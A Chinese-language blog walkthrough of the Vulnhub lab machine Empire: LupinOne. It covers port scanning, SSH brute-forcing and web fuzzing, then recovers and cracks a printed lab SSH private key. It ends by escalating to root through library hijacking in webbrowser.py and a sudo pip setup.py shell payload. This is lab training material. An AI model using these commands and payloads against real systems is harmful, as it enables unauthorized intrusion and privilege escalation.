---
title: 靶机渗透实战基础-Vulnhub-Empire:LupinOne
date: 2024-01-03 17:23:11
tags: 渗透测试
mathjax: true
---

# 靶机渗透实战基础-Vulnhub-Empire:LupinOne

## 端口发现

```bash
sudo nmap 192.168.31.100 -n -Pn -p- --reason -sV -sC -O
```

回显内容：

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-03 09:44 CST
Nmap scan report for 192.168.31.100
Host is up, received arp-response (0.0072s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE REASON         VERSION
22/tcp    open     ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-title: Site doesn't have a title (text/html).
30071/tcp filtered unknown no-response
MAC Address: 68:17:29:E3:EC:39 (Intel Corporate)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.75 seconds
```

## 漏洞发现

### OpenSSH 8.4p1

```bash
searchsploit OpenSSH
```

很遗憾没有可用漏洞，尝试弱口令：

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 192.168.31.100 ssh
hydra -C /usr/share/wordlists/legion/ssh-betterdefaultpasslist.txt 192.168.31.100 ssh
```

失败。

### Apache httpd 2.4.48

搜索漏洞：

```bash
searchsploit Apache
```

也没有。

### URL发现

nmap暴露了robots.txt：

```
User-agent: *
Disallow: /~myfiles
```

实际上没有这个`~myfiles`目录，直接爆：

```bash
dirb http://192.168.31.100 -r
```

结果价值不大：

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan  3 09:57:50 2024
URL_BASE: http://192.168.31.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.31.100/ ----
==> DIRECTORY: http://192.168.31.100/image/                                                                                                                    
+ http://192.168.31.100/index.html (CODE:200|SIZE:333)                                                                                                         
==> DIRECTORY: http://192.168.31.100/javascript/                                                                                                               
==> DIRECTORY: http://192.168.31.100/manual/                                                                                                                   
+ http://192.168.31.100/robots.txt (CODE:200|SIZE:34)                                                                                                          
+ http://192.168.31.100/server-status (CODE:403|SIZE:279)                                                                                                      
                                                                                                                                                               
-----------------
END_TIME: Wed Jan  3 09:58:33 2024
DOWNLOADED: 4612 - FOUND: 3
```

尝试模糊测试：

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://192.168.31.100/~FUZZ
```

搜到FUZZ处为secret，然后爆目录：

```bash
dirb http://192.168.31.100/~secret
```

搜到一个，没啥用：

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan  3 10:23:05 2024
URL_BASE: http://192.168.31.100/~secret/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.31.100/~secret/ ----
+ http://192.168.31.100/~secret/index.html (CODE:200|SIZE:331)                                                                                                 
                                                                                                                                                               
-----------------
END_TIME: Wed Jan  3 10:23:27 2024
DOWNLOADED: 4612 - FOUND: 1
```

再次尝试模糊测试，这次寻找无后缀和.txt两种后缀：

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -z list,".txt"- --hc 403,404 http://192.168.31.100/~secret/FUZZFUZ2Z
```

无结果：

```
 /home/monoceros406/.local/lib/python3.11/site-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.31.100/~secret/FUZZFUZ2Z
Total requests: 175328

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000007:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000001:   200        5 L      54 W       331 Ch      "# directory-list-2.3-small.txt - .txt"                                                        
000000003:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000015:   200        5 L      54 W       331 Ch      "# or send a letter to Creative Commons, 171 Second Street, - .txt"                            
000000028:   200        5 L      54 W       331 Ch      "http://192.168.31.100/~secret/"                                                               
000000023:   200        5 L      54 W       331 Ch      "# on at least 3 different hosts - .txt"                                                       
000000025:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000024:   200        5 L      54 W       331 Ch      "# on at least 3 different hosts"                                                              
000000026:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000022:   200        5 L      54 W       331 Ch      "# Priority-ordered case-sensitive list, where entries were found"                             
000000021:   200        5 L      54 W       331 Ch      "# Priority-ordered case-sensitive list, where entries were found - .txt"                      
000000020:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000014:   200        5 L      54 W       331 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                              
000000018:   200        5 L      54 W       331 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                          
000000017:   200        5 L      54 W       331 Ch      "# Suite 300, San Francisco, California, 94105, USA. - .txt"                                   
000000019:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000016:   200        5 L      54 W       331 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                   
000000013:   200        5 L      54 W       331 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - .txt"                       
000000012:   200        5 L      54 W       331 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                
000000008:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000002:   200        5 L      54 W       331 Ch      "# directory-list-2.3-small.txt"                                                               
000000004:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000005:   200        5 L      54 W       331 Ch      "# Copyright 2007 James Fisher - .txt"                                                         
000000006:   200        5 L      54 W       331 Ch      "# Copyright 2007 James Fisher"                                                                
000000010:   200        5 L      54 W       331 Ch      "# This work is licensed under the Creative Commons"                                           
000000009:   200        5 L      54 W       331 Ch      "# This work is licensed under the Creative Commons - .txt"                                    
000000011:   200        5 L      54 W       331 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - .txt"                         
000091294:   200        5 L      54 W       331 Ch      "http://192.168.31.100/~secret/"                                                               

Total time: 0
Processed Requests: 175328
Filtered Requests: 175300
Requests/sec.: 0
```

估计是隐藏文件，前面加个点试试：

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -z list,".txt"- --hc 403,404 http://192.168.31.100/~secret/.FUZZFUZ2Z
```

找到宝贝：

```
/home/monoceros406/.local/lib/python3.11/site-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.31.100/~secret/.FUZZFUZ2Z
Total requests: 175328

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================

000000007:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000028:   200        5 L      54 W       331 Ch      "http://192.168.31.100/~secret/."                                                              
000000026:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000025:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000023:   200        5 L      54 W       331 Ch      "# on at least 3 different hosts - .txt"                                                       
000000024:   200        5 L      54 W       331 Ch      "# on at least 3 different hosts"                                                              
000000021:   200        5 L      54 W       331 Ch      "# Priority-ordered case-sensitive list, where entries were found - .txt"                      
000000022:   200        5 L      54 W       331 Ch      "# Priority-ordered case-sensitive list, where entries were found"                             
000000019:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000014:   200        5 L      54 W       331 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                              
000000017:   200        5 L      54 W       331 Ch      "# Suite 300, San Francisco, California, 94105, USA. - .txt"                                   
000000020:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000018:   200        5 L      54 W       331 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                          
000000016:   200        5 L      54 W       331 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                   
000000011:   200        5 L      54 W       331 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this - .txt"                         
000000010:   200        5 L      54 W       331 Ch      "# This work is licensed under the Creative Commons"                                           
000000012:   200        5 L      54 W       331 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                
000000009:   200        5 L      54 W       331 Ch      "# This work is licensed under the Creative Commons - .txt"                                    
000000013:   200        5 L      54 W       331 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - .txt"                       
000000006:   200        5 L      54 W       331 Ch      "# Copyright 2007 James Fisher"                                                                
000000005:   200        5 L      54 W       331 Ch      "# Copyright 2007 James Fisher - .txt"                                                         
000000008:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000002:   200        5 L      54 W       331 Ch      "# directory-list-2.3-small.txt"                                                               
000000004:   200        5 L      54 W       331 Ch      "#"                                                                                            
000000003:   200        5 L      54 W       331 Ch      "# - .txt"                                                                                     
000000015:   200        5 L      54 W       331 Ch      "# or send a letter to Creative Commons, 171 Second Street, - .txt"                            
000000001:   200        5 L      54 W       331 Ch      "# directory-list-2.3-small.txt - .txt"                                                        
000091294:   200        5 L      54 W       331 Ch      "http://192.168.31.100/~secret/."                                                              
000168723:   200        1 L      1 W        4689 Ch     "mysecret - .txt"                                                                              

Total time: 0
Processed Requests: 175328
Filtered Requests: 175299
Requests/sec.: 0
```

下载.mysecret.txt：

```bash
wget -c http://192.168.31.100/~secret/.mysecret.txt
```

不知道是啥加密，试一下发现是Base58：

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```

密钥保存文件为sshkey。

## SSH连接

拿到SSH密钥，又之前index.html提示用户名为icex64，故尝试连接：

```bash
ssh icex64@192.168.31.100 -i sshkey
```

提示sshkey文件访问权限过大，失效：

```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'sshkey' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "sshkey": bad permissions
```

更改权限：

```bash
sudo chmod 0600 ./sshkey
```

再次尝试连接，发现SSH私钥需要解密密钥，尝试John-The-Ripper爆破：

```bash
ssh2john sshkey > sshkey.john
john sshkey.john --wordlist=/usr/share/wordlists/fasttrack.txt
```

密钥是：

```
Created directory: /home/monoceros406/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (sshkey)     
1g 0:00:00:00 DONE (2024-01-03 14:48) 1.123g/s 287.6p/s 287.6c/s 287.6C/s Spring2017..monkey
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

成功登录！

```bash
id icex64
```

然而icex64并不是root权限：

```
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
```

## 提权

### SUID利用法

寻找存在SUID利用的系统命令：

```bash
find -perm 4000 2>/dev/null
```

一点也没有。

### sudo法

```bash
sudo -l
```

发现可免密使用arsene用户身份执行某个命令：

```
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

查看arsene用户权限：

```
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

可惜arsene也不是root权限，顶多算横向提权。

查看两文件属性：

```bash
stat /usr/bin/python3.9
```

发现都没有写权限，无法写入提权命令：

```
  File: /usr/bin/python3.9
  Size: 5479736         Blocks: 10704      IO Block: 4096   regular file
Device: 801h/2049d      Inode: 2104474     Links: 1
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2021-10-07 05:23:45.486213333 -0400
Modify: 2021-02-28 12:03:44.000000000 -0500
Change: 2021-10-04 08:01:51.077034082 -0400
 Birth: 2021-10-04 08:01:50.865034089 -0400
  
  File: /home/arsene/heist.py
  Size: 118             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 2361164     Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/  arsene)   Gid: ( 1000/  arsene)
Access: 2021-10-04 14:29:27.599885903 -0400
Modify: 2021-10-04 14:16:52.894057246 -0400
Change: 2021-10-04 14:16:52.894057246 -0400
 Birth: 2021-10-04 14:16:52.894057246 -0400
```

查看heist.py文件：

```python
import webbrowser
print ("Its not yet ready to get in action")
webbrowser.open("https://empirecybersecurity.co.mz")
```

发现引用了webbrowser库，如果webbrowser.py有写入权限，则成功：

```bash
stat /usr/lib/python3.9/webbrowser.py
```

发现权限都给齐了：

```
  File: /usr/lib/python3.9/webbrowser.py
  Size: 24087           Blocks: 48         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 2359824     Links: 1
Access: (0777/-rwxrwxrwx)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2021-10-04 14:00:25.794034274 -0400
Modify: 2021-10-04 18:45:25.265866234 -0400
Change: 2021-10-04 18:45:25.265866234 -0400
 Birth: 2021-10-04 08:01:52.125034052 -0400
```

在这里找Python的Sudo提权法：https://gtfobins.github.io/

在webbroswer.py中写入：

```python
os.system("/bin/bash")
```

横向越权：

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

得到arsene的Shell，并查看arsene免密命令：

```bash
sudo -l
```

找到免密使用root身份执行/usr/bin/pip：

```
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

在GTFOBins中查找pip的Shell提权法：

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

确认身份：

```bash
whoami && id && hostname && ip addr
```

成功获得root权限！
